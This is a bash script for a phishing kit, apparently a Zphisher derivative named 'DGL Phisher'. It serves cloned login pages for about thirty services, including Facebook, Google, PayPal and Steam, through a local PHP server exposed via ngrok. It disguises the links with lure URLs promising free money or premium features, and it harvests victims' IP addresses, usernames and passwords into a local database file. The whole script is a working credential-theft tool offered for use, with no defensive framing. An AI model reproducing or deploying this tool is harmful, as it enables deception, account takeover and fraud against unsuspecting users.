#!/bin/bash
source $PODGL/lib/fsh.cfg.sh

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[0;32m')"   BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[97m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  GREENBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    cerr Process Interrupted ..!
    exit 0
}

exit_on_signal_SIGTERM() {
    cerr Received SIGTERM Signal...! Terminating Process...
    sleep 0.5
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
}

## Banner
banner() {
   cout DGL: Getting Things Ready....
   sleep 0.3
   cout DGL: Loading...
   sleep 0.3
   cout DGL: Continuing
   sleep 0.3
}

## Small Banner
banner_small(){
   cout BSP Executed, Continuing...
   sleep 0.2
}

## Dependencies
dependencies() {
	cout Installing Packages Required to Startup...

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			cout Installing Proot \(Termux\)...
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		cout Every Thing is OK..! Continuing
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				cout Installing $pkg
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					cerr An Error Occured, Try Installing Packages Manually Then Restart
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		cerr Error Installing NGROK Tunneling, Try Doing it Manually Then Restart
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		cout Ngrok Found...! Continuing...
	else
		cout Installing Ngrok Tunneling...
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Exit message
msg_exit() {
	{ banner; echo; }
	cout DGL: Leaving....
        sleep 0.3
	{ reset_color; exit 0; }
}

## About
about() {
   cout DGL Framework Coded By Mahmoud, Please Read DGL README.md File For More Information Aboud Me
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	cout Getting Server Ready...
        sleep 0.3
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	cout Starting a PHP Server...
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$' '
	cout Victim IP Address : ${GREEN}$IP
	cout Victim IP Saved In ip.txt
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$' '
	cout Account  : ${GREEN}$ACCOUNT
 	cout Password : ${GREEN}$PASSWORD
        echo
	cout All Data Saved In : DGL_Phisher_database.txt
	cat .server/www/usernames.txt >> DGL_Phisher_database.txt
	cout Waiting For More Victims...., Press CTRL + C To Stop
}

## Print data
capture_data() {
	cout Waiting Victim To Login..... Press CTRL + C To Stop
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			cout Victim Openend The Link !!! IP Address Captured..!
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			cout Victim Has Logged In..! Credentials Captured..!
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	cout Starting Up.... http://$HOST:$PORT
	{ sleep 1; setup_site; }
	cout Launching NGROK For Tunneling Services...!

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	cout Use This URL    : ${GREEN}$ngrok_url
	cout Or Use This URL : ${GREEN}$mask@$ngrok_url1
	capture_data
}

## Start localhost
start_localhost() {
	cout Getting Few Ready ... \( ${CYAN}http://$HOST:$PORT ${GREEN}\)
	setup_site
	{ sleep 1; }
	cout Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}
	capture_data
}

## Tunnel selection
tunnel_menu() {

		cout 01 ${GREEN} Localhost
		cout 02 ${GREEN} Ngrok.io  ${YELLOW}\(Recommented\)

	read -p ${WHITE}"CHOOSE a port forwarding service -->: ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		cerr Invalid Option.!
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
		cout 01 ${GREEN} Traditional Login Page
		cout 02 ${GREEN} Advanced Voting Poll Login Page
		cout 03 ${GREEN} Fake Security Login Page
		cout 04 ${GREEN} Facebook Messenger Login Page

	read -p ${WHITE}"CHOOSE -->: ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://make-your-facebook-secured-and-free-from-hackers'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		cerr Invalid Option.!
		{ sleep 1; site_facebook; }
	fi
}

## Instagram
site_instagram() {
		cout 01 ${GREEN} Traditional Login Page
		cout 02 ${GREEN} Auto Followers Login Page
		cout 03 ${GREEN} 1000 Followers Login Page
		cout 04 ${GREEN} Blue Badge Verify Login Page

	read -p ${WHITE}"CHOOSE -->: ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://get-1000-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		cerr Invalid Option.!
		{ sleep 1;  site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
		cout 01 ${GREEN} Gmail Old Login Page
		cout 02 ${GREEN} Gmail New Login Page
		cout 03 ${GREEN} Advanced Voting Poll
	read -p "${WHITE}CHOOSE -->: ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		cerr Invalid Option.!
		{ sleep 1;  site_gmail; }
	fi
}

## Vk
site_vk() {
		cout 01 ${GREEN} Traditional Login Page
		cout 02 ${GREEN} Advanced Voting Poll Login Page
	read -p "Select an option : ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium-real-method-2020'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		cerr Invalid Option.!
		{ sleep 1; site_vk; }
	fi
}

## Menu
main_menu() {
	{ banner; echo; }
		cout Select A Website To Start..!

		cout 01 ${GREEN} Facebook"    "${WHITE} 11 ${GREEN} Twitch"    "${WHITE} 21 ${GREEN} DeviantArt
		cout 02 ${GREEN} Instagram"   "${WHITE} 12 ${GREEN} Pinterest" "${WHITE} 22 ${GREEN} Badoo
		cout 03 ${GREEN} Google"      "${WHITE} 13 ${GREEN} Snapchat"  "${WHITE} 23 ${GREEN} Origin
		cout 04 ${GREEN} Microsoft"   "${WHITE} 14 ${GREEN} Linkedin"  "${WHITE} 24 ${GREEN} DropBox
		cout 05 ${GREEN} Netflix"     "${WHITE} 15 ${GREEN} Ebay"      "${WHITE} 25 ${GREEN} Yahoo
		cout 06 ${GREEN} Paypal"      "${WHITE} 16 ${GREEN} Quora"     "${WHITE} 26 ${GREEN} Wordpress
		cout 07 ${GREEN} Steam"       "${WHITE} 17 ${GREEN} Protonmail""${WHITE} 27 ${GREEN} Yandex
		cout 08 ${GREEN} Twitter"     "${WHITE} 18 ${GREEN} Spotify"   "${WHITE} 28 ${GREEN} StackoverFlow
		cout 09 ${GREEN} Playstation" "${WHITE} 19 ${GREEN} Reddit"    "${WHITE} 29 ${GREEN} Vk
		cout 10 ${GREEN} Tiktok"      "${WHITE} 20 ${GREEN} Adobe"     "${WHITE} 30 ${GREEN} XBOX
		cout 31 ${GREEN} Mediafire"   "${WHITE} 32 ${GREEN} Gitlab"    "${WHITE} 33 ${GREEN} Github

		cout 00 Exit
	read -p "${ORANGE}CHOOSE -->: ${GREEN}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="microsoft"
		mask='http://unlimited-onedrive-space-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="netflix"
		mask='http://upgrade-your-netflix-plan-free'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="steam"
		mask='http://steam-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="twitter"
		mask='http://get-blue-badge-on-twitter-free'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="playstation"
		mask='http://playstation-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="tiktok"
		mask='http://tiktok-free-liker'
		tunnel_menu
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		mask='http://unlimited-twitch-tv-user-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		mask='http://get-a-premium-plan-for-pinterest-free'
		tunnel_menu
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		mask='http://view-locked-snapchat-accounts-secretly'
		tunnel_menu
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		mask='http://get-a-premium-plan-for-linkedin-free'
		tunnel_menu
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 16 ]]; then
		website="quora"
		mask='http://quora-premium-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 17 ]]; then
		website="protonmail"
		mask='http://protonmail-pro-basics-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		mask='http://convert-your-account-to-spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		mask='http://reddit-official-verified-member-badge'
		tunnel_menu
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		mask='http://get-adobe-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 21 ]]; then
		website="deviantart"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 22 ]]; then
		website="badoo"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 23 ]]; then
		website="origin"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 24 ]]; then
		website="dropbox"
		mask='http://get-1TB-cloud-storage-free'
		tunnel_menu
	elif [[ "$REPLY" == 25 ]]; then
		website="yahoo"
		mask='http://grab-mail-from-anyother-yahoo-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 26 ]]; then
		website="wordpress"
		mask='http://unlimited-wordpress-traffic-free'
		tunnel_menu
	elif [[ "$REPLY" == 27 ]]; then
		website="yandex"
		mask='http://grab-mail-from-anyother-yandex-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 28 ]]; then
		website="stackoverflow"
		mask='http://get-stackoverflow-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 29 ]]; then
		site_vk
	elif [[ "$REPLY" == 30 ]]; then
		website="xbox"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 31 ]]; then
		website="mediafire"
		mask='http://get-1TB-on-mediafire-free'
		tunnel_menu
	elif [[ "$REPLY" == 32 ]]; then
		website="gitlab"
		mask='http://get-1k-followers-on-gitlab-free'
		tunnel_menu
	elif [[ "$REPLY" == 33 ]]; then
		website="github"
		mask='http://get-1k-followers-on-github-free'
		tunnel_menu
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		cerr Invalid Option.!
		{ sleep 1; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
